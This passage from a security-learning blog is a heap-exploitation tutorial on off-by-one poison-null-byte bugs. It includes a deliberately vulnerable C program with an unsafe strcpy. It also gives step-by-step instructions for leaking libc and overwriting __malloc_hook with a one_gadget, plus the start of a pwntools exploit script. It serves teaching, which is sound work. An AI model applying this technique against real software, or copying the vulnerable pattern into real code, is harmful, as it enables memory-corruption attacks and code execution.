1)}.post-image:after{content:"";display:table;width:100%;padding-top:50%}.post-head,.post-content{background:rgba(35,36,39,0.95)}.post-content{padding:40px 15px;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25)}.post-head,.post-body{margin-bottom:20px;border-bottom:1px solid #3E4250}.post-head{padding-bottom:30px}.post-head .post-tag{margin-bottom:20px;text-align:center}.post-head .post-tag .tag{display:inline-block;padding:5px 15px;margin-right:5px;font-size:12px;line-height:18px;font-weight:bold;border:1px solid #1ABC9C;text-transform:capitalize;color:#1ABC9C;transition:.35s}.post-head .post-tag .tag:last-child{margin-right:0}.post-head .post-tag .tag:hover{background:#1ABC9C;color:#fff}.post-head .post-title{font-size:28px;text-align:center;font-weight:normal;line-height:28px;margin-bottom:5px}.post-head .post-date span{font-size:12px}.post-info,.post-info-author{display:flex;justify-content:center;align-items:center;flex-wrap:wrap}.post-info .post-info-author .info-author-avatar{display:inline-block;width:32px;height:32px;margin-right:10px;border-radius:50%;background-position:center;background-size:cover;background-repeat:no-repeat}.post-info .post-info-author .info-author-name,.post-info .post-info-author span{font-size:12px;text-transform:uppercase}.post-info .post-info-author span{margin-right:10px}.post-info .post-info-author .info-author-name{position:relative;padding-right:20px;margin-right:15px;color:#C9D3E7}.post-info .post-info-author .info-author-name:after{content:"";position:absolute;top:50%;right:0;transform:translateY(-50%);display:block;width:2px;height:12px;background:#3E4250}.post-body{padding-bottom:20px}.post-share{padding:10px 0}.post-share .share-item{display:inline-block;padding-right:15px}.post-share .share-item a{color:#3E4250}.post-share .share-item a:hover{color:#1ABC9C}.post-share .share-item a i.ion{font-size:20px}.post-navigation{display:flex;flex-wrap:wrap;margin-top:30px}.prev,.next{flex-basis:100%;padding:15px;background:#26272B}.prev:hover,.next:hover{background:#1f2023}.prev:hover .post-nav-title,.next:hover .post-nav-title{color:#1ABC9C;transition:.35s}.prev .post-nav-arrow,.next .post-nav-arrow{font-size:14px;color:#C9D3E7}.prev .post-nav-title,.next .post-nav-title{font-size:18px;color:#C9D3E7;transition:.35s}.prev{margin-bottom:10px}.prev,.next{text-align:center}.comments{padding:0 15px;background:#232427}@media only screen and (min-width: 576px){.post-content{padding:40px}.post-head .post-title{font-size:43px;line-height:43px;margin-bottom:10px}.post-navigation{display:flex;justify-content:space-between;flex-wrap:nowrap}.prev,.next{flex-basis:48%;padding:20px}.prev .post-nav-title,.next .post-nav-title{font-size:21px}.prev{text-align:left;margin-bottom:0}.next{text-align:right}.comments{padding:0 40px}}.page{margin-bottom:20px}.page-image-box{background:#101010}.page-image-box.reveal-in .page-image{opacity:1}.page-image{min-height:500px;margin-bottom:30px;background-size:contain;background-position:center;background-repeat:no-repeat;background-color:#101010;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25);opacity:1;transition:all 1s cubic-bezier(0.6, 0.3, 0, 1)}.page-image:after{content:"";display:table;width:100%}.page-content{padding:40px 15px;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25);background:rgba(35,36,39,0.95)}.page-head{padding-bottom:30px}.page-head .page-title{font-size:28px;text-align:center;font-weight:normal;line-height:28px;margin-bottom:0}.page-head,.page-body{margin-bottom:20px;border-bottom:1px solid #3E4250}.page-body{padding-bottom:20px}@media only screen and (min-width: 576px){.page-content{padding:40px}.page-head .page-title{font-size:43px;line-height:43px;margin-bottom:10px}}.highlighter-rouge{background-color:#333333}.tags-list{display:flex;flex-wrap:wrap;margin:40px 0;padding:0;list-style:none}.tags-list .tags-item{margin:5px}.tags-list .tags-link{display:inline-block;padding:7px 12px;font-size:14px;border-radius:4px;color:#C9D3E7;font-weight:700;background:#2C2F36}.tags-list .tags-link:hover{color:#fff;background:#1ABC9C}.tags-title{margin-bottom:5px}.tags-group{margin-bottom:30px}.text-left{text-align:left}.text-right{text-align:right}.text-center{text-align:center}.text-justify{text-align:justify}.block{display:block}.inline-block{display:inline-block}.inline{display:inline}.vertical-center{display:flex;align-items:center;justify-content:center}.show{display:block !important}.hide{display:none !important}.invisible{visibility:hidden}.float-left{float:left}.float-right{float:right}.no-padding{padding:0}.no-margin{margin:0}.clearfix::after,.clearfix ::before{content:"";display:table;clear:both}.list-reset{list-style-type:none;margin:0;padding:0}.screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px;word-wrap:normal !important}

  </style>
</head>


<body>

  
  <div class="preloader">
  <div class="loader">
    <span>Loading</span>
  </div>
</div> <!-- /.loader -->
  <header class="header">
  <div class="container">
    <div class="row">
      <div class="col col-12">
        <div class="header-box">
          <div class="logo-title">
            <a href="/new_blog/" class="logo-text">UPsecurity</a>
          </div>

          <nav class="nav-menu">
            <i class="menu-close ion ion-ios-close"></i>
            <ul class="menu-list">
              <li class="menu-item"><a href="/new_blog/" class="menu-link">Home</a></li>
              <!--  -->
              
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  <li class="menu-item"><a href="/new_blog/research-project/" class="menu-link">R&D Project</a></li>
                  
                  
                
              
                
                  
                  
                  <li class="menu-item"><a href="/new_blog/about/" class="menu-link">About</a></li>
                  
                  
                
              
                
                  
                
              
                
                  
                  
                  <li class="menu-item"><a href="/new_blog/learning-outcomes/" class="menu-link">Proof learning outcomes</a></li>
                  
                  
                
              
                
                  
                  
                  <li class="menu-item"><a href="/new_blog/learning-plan/" class="menu-link">Personal learning plan</a></li>
                  
                  
                
              
                
                  
                
              
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
            </ul>
          </nav>
          <div class="nav-buttons">
            <i class="menu-button d-hide ion ion-ios-menu"></i>
            <i class="search-button ion ion-ios-search"></i>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="search">
    <div class="search-box">
      <i class="search-close-button ion ion-ios-close"></i>
      <label for="js-search-input" class="screen-reader-text"></label>
      <input type="text" id="js-search-input" class="search-text" autocomplete="off" placeholder="Search Something...">
      <ol id="js-results-container" class="search-results-list"></ol>
    </div>
  </div>
</header> <!-- /.header -->


      <div class="container">
	<div class="row">
		<div class="col col-12">
			<div class="post-image-box">
				
					<div class="page-image" style="background-image: url(/new_blog/img//heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-23-39.png)"></div>
				
			</div>
		</div>
	</div>
</div>

<div class="container">
	<div class="row">
		<article class="col col-12 col-t-8 post">
			<div class="post-content">

				<div class="post-head">
					
					<div class="post-tag">
						
						<a href="/new_blog/tags#Heap exploiting" class="tag">Heap exploiting</a>
						
					</div>
					
					<h1 class="post-title">Heap exploiting 8: Info leak &amp; Poison null byte</h1>
					<div class="post-info">
						<div class="post-info-author">
							<div class="info-author-avatar" style="background-image: url(/new_blog/img/me.jpg)"></div>
							<span>by</span>
							<span class="info-author-name">Ren√© van Vliet</span>
						</div>
						<div class="post-date">
							<span>
								<time datetime="2020-11-08T08:05:55+01:00">Nov 08, 2020</time>
							</span>
						</div>
					</div>
				</div>

				<div class="post-body">
					<h1 id="info-leak--poision-null-byte-off-by-one">Info leak &amp; Poision null byte (Off-by-one)</h1>

<p>What is an off-by-one bug?</p>

<p>copying source string into destination buffer could result in off-by-one when</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Source string length is equal to destination buffer length.
</code></pre></div></div>

<p>When source string length is equal to destination buffer length, a single NULL byte gets copied just above the destination buffer. Here since the destination buffer is located in heap, the single NULL byte could overwrite the chunk header of next chunk and this could lead to arbitrary code execution.
[1]</p>

<p>In this blogpost i will talk about info leaks and an off by one bug. I combined the two topics because an off by one bug can usually result in leakage of an address.</p>

<p>So to investigate this we have to know two things:</p>
<ul>
  <li>What is an info leak?</li>
  <li>What is a off-by-one bug</li>
</ul>

<h2 id="information-leak">Information leak</h2>
<p>An information leak is a way to extract address information of a running binary. Usually the program does not expose memory addresses.</p>

<p>If we can leak the libc address or an address close to the libc address we can circumvent ASLR because we do not have to use static address values but can request them every time the binary runs.</p>

<h2 id="off-by-one-bug">Off-by-one bug</h2>
<p>An Off-by-one vulnerability is a specific version of a buffer overflow. The way it works is that you <strong>can</strong> overflow, but only one byte. and the overwritten byte will result in \x00.</p>

<p>In the C language strings are delimited with a \x00 byte. When you call strlen on a string it will result in the length of the string without the delimiter.</p>

<p>This is why beginner programs can make the mistake of thinking that when you copy a string the destination size is equal to the size of the source strlen.
So they will check for the length and it seems in range but on the copy it will also copy the \x00 byte delimiter and it will overwrite the first byte after the buffer.</p>

<h3 id="how-can-we-use-an-off-by-one-vulnerability">How can we use an off-by-one vulnerability</h3>
<ol>
  <li>The overflow byte is any byte that can be controlled: by modifying the size, there is overlap between the block structures, thereby leaking other block data or overwriting other block data. You can also use the NULL byte overflow method.</li>
  <li>The overflow byte is NULL. When the size is 0x100, overflowing the NULL byte makes the prev_in_use bit clear, so the previous block is considered a free block. (1) At this point you can choose to use the unlink method (see the unlink section) for processing. (2) In addition, when the prev_size field is enabled, you can forge prev_size, causing overlap between blocks. The key to this method is that unlink does not check whether the last block of the block found by prev_size (theoretically the block currently unlinked) is equal to the block size currently being unlinked.</li>
</ol>

<p>[2] (ctf-wiki.github.io)</p>

<h1 id="vulnerable-program">Vulnerable program</h1>
<p>I created a basic program to display the weakness. The functionalities it has are: malloc, free, read.
Try to find the weakness.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
 *
 * heap.c
 *
 * sample program: heap off-by-one vulnerability
 * 
 * gcc heap.c -pie -fPIE -Wl,-z,relro,-z,now -o heap
 * patchelf --set-rpath ../.glibc/glibc_2.23 --set-interpreter ../.glibc/glibc_2.23/ld.so.2 ./heap
 */</span>

<span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">m_arr</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>


<span class="c1">// Malloc function</span>
<span class="kt">void</span> <span class="nf">create_chunk</span><span class="p">()</span> <span class="p">{</span>

  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>

  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">m_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">index</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">==</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Max malloc pages reached (10), free one to continue.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">using index %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"size: "</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">1023</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Size cannot exceed 1023.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"data: "</span><span class="p">);</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
  <span class="n">buf</span><span class="p">[</span><span class="n">size</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
  
  <span class="n">m_arr</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">m_arr</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">buf</span><span class="p">);</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"successfully created chunk</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// read chunk data</span>
<span class="kt">void</span> <span class="nf">read_chunk</span><span class="p">(){</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"index: "</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"invalid index, max index is 9</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">m_arr</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Chunk does not exist.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">data: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">m_arr</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>

<span class="p">}</span>

<span class="c1">// Free chunk</span>
<span class="kt">void</span> <span class="nf">delete_chunk</span><span class="p">(){</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"index: "</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"invalid index, max index is 9</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">m_arr</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Chunk does not exist</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">free</span><span class="p">(</span><span class="n">m_arr</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
  <span class="n">m_arr</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"successfully deleted chunk</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="c1">// Disable buffering</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="c1">// Print menu</span>
  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">choice</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"1. create</span><span class="se">\n</span><span class="s">2. delete</span><span class="se">\n</span><span class="s">3. print</span><span class="se">\n</span><span class="s">4. exit"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
  
    <span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">case</span> <span class="mi">1</span><span class="p">:</span> <span class="n">create_chunk</span><span class="p">();</span> <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2</span><span class="p">:</span> <span class="n">delete_chunk</span><span class="p">();</span> <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3</span><span class="p">:</span> <span class="n">read_chunk</span><span class="p">();</span> <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">4</span><span class="p">:</span> <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
      <span class="nl">default:</span> <span class="n">puts</span><span class="p">(</span><span class="s">"invalid choice"</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>on first look it seems like a solid way to handle reading into the chunk but there is one problem.
The strcpy function inside the create_chunk function copies the terminating null-byte which we can use to overflow the heap-chunk.</p>

<p>Note, For the most part i will annotate every step in this guide in the exploit script.
I‚Äôve added a debug_from_step variable that automatically pauses the execution so you can see the values changing in GDB.
The exploit script will be on the bottom of this page.</p>

<h3 id="step-1-step-1-create-four-chunks">Step 1: Step 1: create four chunks</h3>
<p>So we start of with 4 chunks, I created this layout because we need the first unsorted bin to exclude it from the fastbins, then one fastbin to control the libc and write. After that an unsortedbin to bypass the coalesce. Then chunk_D to circumvent the top_chunk merging.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>malloc(0xf8, 'A'*0xf8) # chunk_A, index = 0, unsortedbin size
malloc(0x68, 'B'*0x68) # chunk_B, index = 1, fastbin 0x70
malloc(0xf8, 'C'*0xf8) # chunk_C, index = 2, Unsortedbin size
malloc(0x10, 'D'*0x10) # chunk_D, index = 3, fastbin 0x20
</code></pre></div></div>
<p>Resulting in four chunks:
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-17-56.png" alt="" /></p>

<h3 id="step-2-delete-chunk_a">Step 2: Delete chunk_A</h3>
<p>We start with freeing the unsortedbin chunk (chunk_A), this will set libc addresses at the fd and bk pointers. We will leak these in a later stage to bypass the ASLR randomization.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-21-01.png" alt="" /></p>

<h3 id="step-3-delete-chunk_b--overwrite-prev_in_use-bit-of-chunk_c">Step 3: Delete chunk_B &amp; Overwrite prev_in_use bit of chunk_C</h3>
<p>The next step is to free chunk_B so that we can trigger the off-by-one vulnerability.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-22-01.png" alt="" /></p>

<p>Then create a new chunk with the exact same size as the previous second chunk. We put in exactly the same amount of data as the size so the on copy will overwrite the prev_in_use flag.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-23-39.png" alt="" />
Look at the blue part which changed from 101 to 100 which means that the prev_in_use flag is now removed.</p>

<h3 id="step-4-set-the-prev_size-of-the-fake-chunk_c">Step 4: set the prev_size of the fake chunk_C</h3>
<p>Now we need to set the prev_size field to a correct value i.e. 0x00000000170. For demonstation purposes i will add it step by step so that you can see it changing easily.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-32-58.png" alt="" /></p>

<p><img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-33-13.png" alt="" />
Here the prev_size value is correctly set.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-33-49.png" alt="" /></p>

<h3 id="step-5-consolidate-chunk_a--chunk_b">Step 5: Consolidate chunk_A &amp; chunk_B</h3>
<p>Now we delete chunk_C to cause a consolidation with the top chunk.  This will create a big chunk of 0x270 bytes of allocatable space.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-37-14.png" alt="" /></p>

<h3 id="step-6-push-available-chunk-space-down">Step 6: Push available chunk space down.</h3>

<p>Now we create a new chunk that will be created from the unsortedbin chunk.
This will put the the location of the fd and bk pointers on the location where the previous chunk_B was.
Because the program still thinks that chunk_B is still allocated and has the correct values (size, prev_size) it can read the memory address.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-40-54.png" alt="" /></p>

<h3 id="step-7-leak-libc">Step 7: Leak libc</h3>
<p>Now we read chunk_B and get the fd pointer.
In this run the fd pointer leaked <code class="language-plaintext highlighter-rouge">0x00007fa175f76b78</code>.</p>

<p>we can calculate the offset to libc. With vmmap we check the address of libc
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-42-48.png" alt="" />
then we calculate the difference:
<code class="language-plaintext highlighter-rouge">hex(0x00007fa175f76b78 - 0x7fa175bdd000)</code>
Resulting in offset: <code class="language-plaintext highlighter-rouge">0x399b78</code></p>

<p>Now everytime the program runs we can extract the libc address, even with ASLR enabled.</p>

<p>Because the chunks are a bit of a mess now we have to restore the size field.</p>

<h3 id="step-8-restore-size-field-of-chunk_b">Step 8: Restore size field of chunk_B</h3>

<p>Chunk_B contains E‚Äôs written by Step 6 so we have to restore it to 0x70 to be able to use it again.
This can be done in one malloc request but for demonstation purposes i did it step by step so you can see it more easily.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-47-43.png" alt="" /></p>

<p><img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-48-41.png" alt="" /></p>

<p><img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-49-00.png" alt="" /></p>

<h3 id="step-9-free-chunk_b">Step 9: Free chunk_B</h3>
<p>When we free chunk_B it will be added to the fastbin list (This will put the fd/bk pointers in memory) &amp; will overwrite these to get arbitrary write functionality. 
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-50-14.png" alt="" /></p>

<h3 id="step-10-free-chunk_e">Step 10: Free chunk_E</h3>
<p>Free chunk_E so it will coalesce with chunk_B
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-51-32.png" alt="" /></p>

<h3 id="step-11-create-chunk_f--write-__malloc_hook">Step 11: Create chunk_F &amp; Write __malloc_hook</h3>
<p>On our next malloc we can overwrite the fd pointer and write our custom addres.
So i started looking into the __malloc_hook to get remote code execution the same way as in the other heap blogs.
Lets look for fake chunks:
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-14-16-24-47.png" alt="" /></p>

<p>On first inspection it doesnt seem to have a valid size field to create a fake chunk. So i ran the find_fake_fast command to see what it thinks.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-14-16-26-29.png" alt="" /><br />
The start of the first address 00007f3cd44ac260
because the quadword before is empty we can take the address at an offset.</p>

<p>So the write address wont be 0x7f3cd44adb10 to write to but 0x7f3cd44adaed
Because aslr is enabled we do not use that address but calculate the offset from libc.
The leaked libc was 0x7f3cd4114000 so the offset will be:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; hex(0x7f3cd44adaed- 0x7f3cd4114000 )
'0x399aed'
</code></pre></div></div>

<p>Chunk_F‚Äôs size will be big enough to be taken from the unsortedbins and large enough to overwrite the freed chunk_B memory and overwrite fd with the __malloc_hook address.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-53-30.png" alt="" /></p>
<h3 id="step-12-restore-chunk_bs-size-field">Step 12: Restore chunk_B‚Äôs size field</h3>
<p>And again we have to restore the size field back to 0x70.
This can be done in one malloc request but for demonstation purposes i did it step by step so you can see it more easily.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-55-52.png" alt="" /></p>

<p><img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-56-10.png" alt="" /></p>

<p><img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-56-37.png" alt="" /></p>

<h3 id="step-13-recreate-chunk_b">Step 13: (Re)Create chunk_B</h3>
<p>When we request the new chunk (chunk_B it will add its forward pointer) to the top of the fastbin list. This Step corrupts the heap so we cant really use vis anymore.</p>

<p><img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-12-14-58-04.png" alt="" /></p>

<p>And now we write our one_gadget to the __malloc_hook We need to prepad the payload with 19 bytes to get from the chunks userdata to the __malloc_hook. To be on the safe side i also appended null bytes to overwrite nearby values.</p>
<h3 id="step-14-write-one_gadget-to-the-__malloc_hook">Step 14: Write one_gadget to the __malloc_hook</h3>
<p>To calculate the one_gadgets i used the one_gadget tool with my libc version and found three possibilities:
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-14-16-41-00.png" alt="" /></p>

<p>So i tried each offset from the libc base address and found that 0xd6701 worked. Note this may differ if you use another libc library.
Now we create a new 0x70 chunk to get the chunk thats in the fastbin (our __malloc_hook address)
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-14-16-38-04.png" alt="" /></p>
<h3 id="step-15-trigger-the-__malloc_hook-by-making-a-request">Step 15: Trigger the __malloc_hook by making a request</h3>
<p>The final step is to trigger the malloc_hook by executing a final malloc request.
<img src="/new_blog/img/heap-exploitation/Off_by_one/Clipboard_2020-11-14-16-44-48.png" alt="" /></p>

<h1 id="exploit-script">Exploit script</h1>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'split'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary_name</span> <span class="o">=</span> <span class="s">"./heap"</span>
<span class="n">remote_host</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">remote_port</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">gdbinit</span> <span class="o">=</span> <span class="s">"""
continue
"""</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary_name</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>

<span class="n">p</span> <span class="o">=</span> <span class="bp">None</span>

<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
  <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbinit</span><span class="p">)</span>
<span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
  <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_host</span><span class="p">,</span><span class="n">remote_port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
  <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary_name</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
  <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
  <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
  <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'data: '</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

